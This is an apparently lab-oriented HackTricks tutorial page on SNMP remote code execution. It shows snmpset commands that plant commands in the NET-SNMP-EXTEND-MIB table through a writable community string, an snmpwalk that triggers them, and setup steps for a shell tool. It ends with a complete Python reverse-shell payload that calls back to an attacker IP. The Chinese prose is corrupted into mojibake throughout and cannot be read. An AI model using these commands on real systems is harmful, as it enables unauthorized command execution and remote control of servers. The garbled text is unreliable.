<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æ”»å‡»</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

# SNMP RCE

å¦‚æœç®¡ç†å‘˜åœ¨è®¾å¤‡æˆ–æœåŠ¡å™¨ä¸Šå¿½è§†äº†SNMPçš„é»˜è®¤é…ç½®ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨SNMPã€‚é€šè¿‡**æ»¥ç”¨å…·æœ‰å†™æƒé™çš„SNMPç¤¾åŒº (rwcommunity)** åœ¨Linuxæ“ä½œç³»ç»Ÿä¸Šï¼Œæ”»å‡»è€…å¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œå‘½ä»¤ã€‚

## é€šè¿‡é™„åŠ å‘½ä»¤æ‰©å±•æœåŠ¡

è¦æ‰©å±•SNMPæœåŠ¡å¹¶æ·»åŠ é¢å¤–å‘½ä»¤ï¼Œå¯ä»¥å‘"nsExtendObjects"è¡¨**è¿½åŠ æ–°è¡Œ**ã€‚è¿™å¯ä»¥é€šè¿‡ä½¿ç”¨`snmpset`å‘½ä»¤å¹¶æä¾›å¿…è¦çš„å‚æ•°æ¥å®ç°ï¼ŒåŒ…æ‹¬å¯æ‰§è¡Œæ–‡ä»¶çš„ç»å¯¹è·¯å¾„å’Œè¦æ‰§è¡Œçš„å‘½ä»¤ï¼š
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
'nsExtendStatus."evilcommand"' = createAndGo \
'nsExtendCommand."evilcommand"' = /bin/echo \
'nsExtendArgs."evilcommand"' = 'hello world'
```
## æ³¨å…¥å‘½ä»¤ä»¥æ‰§è¡Œ

è¦åœ¨SNMPæœåŠ¡ä¸Šè¿è¡Œæ³¨å…¥çš„å‘½ä»¤ï¼Œéœ€è¦è°ƒç”¨çš„äºŒè¿›åˆ¶æ–‡ä»¶/è„šæœ¬å­˜åœ¨ä¸”å¯æ‰§è¡Œã€‚**`NET-SNMP-EXTEND-MIB`** è§„å®šæä¾›å¯æ‰§è¡Œæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ã€‚

ä¸ºäº†ç¡®è®¤æ³¨å…¥å‘½ä»¤çš„æ‰§è¡Œæƒ…å†µï¼Œå¯ä»¥ä½¿ç”¨ `snmpwalk` å‘½ä»¤æ¥æšä¸¾SNMPæœåŠ¡ã€‚**è¾“å‡ºå°†æ˜¾ç¤ºå‘½ä»¤åŠå…¶ç›¸å…³ç»†èŠ‚**ï¼ŒåŒ…æ‹¬ç»å¯¹è·¯å¾„ï¼š
```bash
snmpwalk -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendObjects
```
## è¿è¡Œæ³¨å…¥çš„å‘½ä»¤

å½“**æ³¨å…¥çš„å‘½ä»¤è¢«è¯»å–æ—¶ï¼Œå®ƒå°±ä¼šè¢«æ‰§è¡Œ**ã€‚è¿™ç§è¡Œä¸ºè¢«ç§°ä¸º **`run-on-read()`**ã€‚å‘½ä»¤çš„æ‰§è¡Œå¯ä»¥åœ¨snmpwalkè¯»å–æœŸé—´è¢«è§‚å¯Ÿåˆ°ã€‚

### åˆ©ç”¨SNMPè·å–æœåŠ¡å™¨Shell

ä¸ºäº†æ§åˆ¶æœåŠ¡å™¨å¹¶è·å¾—æœåŠ¡å™¨shellï¼Œå¯ä»¥ä½¿ç”¨mxrchå¼€å‘çš„pythonè„šæœ¬ï¼Œä»[**https://github.com/mxrch/snmp-shell.git**](https://github.com/mxrch/snmp-shell.git)è·å–ã€‚

æˆ–è€…ï¼Œå¯ä»¥é€šè¿‡å°†ç‰¹å®šå‘½ä»¤æ³¨å…¥åˆ°SNMPä¸­æ‰‹åŠ¨åˆ›å»ºä¸€ä¸ªåå‘shellã€‚è¿™ä¸ªå‘½ä»¤è¢«snmpwalkè§¦å‘ï¼Œå»ºç«‹ä¸€ä¸ªåˆ°æ”»å‡»è€…æœºå™¨çš„åå‘shellè¿æ¥ï¼Œä½¿å¾—å¯ä»¥æ§åˆ¶å—å®³æœºå™¨ã€‚
ä½ å¯ä»¥å®‰è£…è¿è¡Œæ­¤è„šæœ¬æ‰€éœ€çš„å‰ææ¡ä»¶ï¼š
```bash
sudo apt install snmp snmp-mibs-downloader rlwrap -y
git clone https://github.com/mxrch/snmp-shell
cd snmp-shell
sudo python3 -m pip install -r requirements.txt
```
æˆ–è€…ä¸€ä¸ªåå‘ shellï¼š
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.84\",8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
```
# å‚è€ƒèµ„æ–™
* [https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/](https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/)


<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
